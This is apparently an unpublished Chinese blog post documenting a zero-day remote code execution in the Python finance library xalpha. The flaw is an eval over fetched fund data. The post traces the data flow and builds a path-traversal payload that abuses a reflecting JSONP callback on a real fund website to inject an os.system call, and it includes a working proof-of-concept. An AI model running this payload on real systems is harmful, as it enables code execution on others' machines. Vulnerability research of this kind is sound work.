---
title: 通用实战 挖掘国产金融类python api库漏洞-高危害RCE 0day
published: false
---
# [](#header-1)0x00、前言  

资产搜集，得到某金融资产前台网站后端源码后审计不出来. 但发现其利用了该框架，于是浅浅记录一下挖洞过程  

这次挖掘在代码绕过方面也走了一点弯路，浪费了不少时间，吸取一下教训  

复现：
至少需要装python3  
xalpha==0.11.4库可以从github上下载，但最好用pip3直接就能把库拉到本地  

环境配置完毕后，执行以下代码  
```python
import xalpha
xalpha.fundinfo("../gaoduan/PinzhongRightApi.aspx?fc=AF5097&callback=jQuery183037745026472073073_ Data_netWorthTrend = __import__('os').system('echo 成功触发'); &_=1688890155531#")
```
就可以看到代码:'echo 成功触发'成功被执行

# [](#header-1)0x01、推理

首先，明确方向. 先放fortify里面扫一遍，整个项目中只发现了一个超高危险函数eval，那么我们先从这里下手看看有没有利用点  
eval 在函数 static func xalpha.fundinfo._basic_init 中所在的核心部分：
```python
class fundinfo(basicinfo):
    def _basic_init(self):
        if self.code.startswith("96"):
            self._hkfund_init()  # 中港互认基金处理
            return
        self._page = rget(self._url)
        if self._page.status_code == 404:
            raise ParserFailure("Unrecognized fund, please check fund code you input.")
        if self._page.text[:800].find("Data_millionCopiesIncome") >= 0:
            raise FundTypeError("This code seems to be a mfund, use mfundinfo instead")

        l = re.match(
            r"[\s\S]*Data_netWorthTrend = ([^;]*);[\s\S]*", self._page.text
        ).groups()[0]
        l = l.replace("null", "None")  # 暂未发现基金净值有 null 的基金，若有，其他地方也很可能出问题！
        l = eval(l)

        ...(eval执行, 忽略下半部分)
        
```

经过观测发现，static func xalpha.fundinfo.__init__ 可以作为切入点改变 static func xalpha.fundinfo._basic_init 中调用的类变量 static variable self._url ，最终调用 eval  
__init__ 中 self._url 所在的核心部分  
```python
class fundinfo(basicinfo):
    def __init__(
            self,
            code,
            round_label=0,
            dividend_label=0,
            fetch=False,
            save=False,
            path="",
            form="csv",
            priceonly=False,
        ):
            if round_label == 1 or (code in droplist):
                label = 1  # the scheme of round down on share purchase
            else:
                label = 0
            if code.startswith("F") and code[1:].isdigit():
                code = code[1:]
            elif code.startswith("M") and code[1:].isdigit():
                raise FundTypeError(
                    "This code seems to be a mfund, use ``mfundinfo`` instead"
                )
            code = code.zfill(6)  # 1234 is the same as 001234
            assert code.isdigit(), "fund code must be a strin of six digits"
            assert len(code) == 6, "fund code must be a strin of six digits"
            self._url = (
                "http://fund.eastmoney.com/pingzhongdata/" + code + ".js"
            )  # js url api for info of certain fund

            ......(不影响堆栈运行, 忽略下半部分)

```

# [](#header-1)0x02、开始构造

在__init__中，发现了可能的调用路径使__init__(payload) 的实参 payload 转换为 _basic_init 中将会调用的 self._url  
payload -> self._url 变量变化链如下所示：
```python
payload
↓
payload = payload.zfill(6)
↓
self._url = "http://fund.eastmoney.com/pingzhongdata/" + payload + ".js"
```
最终self._url = "http://fund.eastmoney.com/pingzhongdata/" + payload.zfill(6) + ".js"  

然后，在某个不远的堆栈中，将会调用 _basic_init(self)，在 _basic_init 中发现了可能的调用路径使变量 self._url 转换为 eval 的实参 l  
self._url -> l 变量变化链如下所示：
```python
self._page = rget(self._url)
↓
l = re.match(
    r"[\s\S]*Data_netWorthTrend = ([^;]*);[\s\S]*", self._page.text
).groups()[0]
↓
l = l.replace("null", "None")
```
最终l = (re.match(
    r"[\s\S]*Data_netWorthTrend = ([^;]*);[\s\S]*", rget("http://fund.eastmoney.com/pingzhongdata/" + payload.zfill(6) + ".js").text
).groups()[0]).replace("null", "None")

那么现在就有一个非常棘手的问题摆在眼前：如何让payload变量经过该网站请求后依然得到我们想要的结果？  
也就是经过  rget("http://fund.eastmoney.com/pingzhongdata/" + payload.zfill(6) + ".js")  后，怎样才能让返回的数据包含我们想要的值？

首先，在/pingzhongdata该路径下，当我们请求对应js后发现返回的内容并不包含原来我们请求的数据，因此在该路径下根本无法操作  
那么现在就有两个方案：  
1、修改url域名. 我起初认为这个问题很好解决，有很多url修改域名的方案. 但我搜索了一下，发现带路径的url根本无法修改域名. 遂放弃修改域名  
2、遍历路径. 我直接在该网站的搜索栏、错误界面中搜索尝试了一下返回的数据是否可控，发现都失败了. 该网站正常业务处理请求，所返回的数据中均不携带任何原先请求的信息(我猜想网站建设者在建设时也考虑到了这一点)  

不过好在经过我半天的找寻，终于发现一个回调函数接口有问题，请求错误回调函数名称时，响应中正好会包含该错误的函数名称. 正好能满足我们的需求:发送错误数据，并让该网站返回我们想要的结果，即返回数据可控  
该回调函数接口如下
```url
http://fund.eastmoney.com/pingzhongdata/gaoduan/PinzhongRightApi.aspx?fc=AF5097&callback=jQuery183037745026472073073_ Data_netWorthTrend=[需要返回的错误数据]&_=1688890155531#
```

于是，我们根据该接口，构造出payload
```
../gaoduan/PinzhongRightApi.aspx?fc=AF5097&callback=jQuery183037745026472073073_ Data_netWorthTrend = __import__('os').system('echo 成功触发'); &_=1688890155531#
```

最后，正则成功捕获到该数据并正确处理，成功eval.  
既然都已经成功触发eval了，那RCE肯定也是小事了



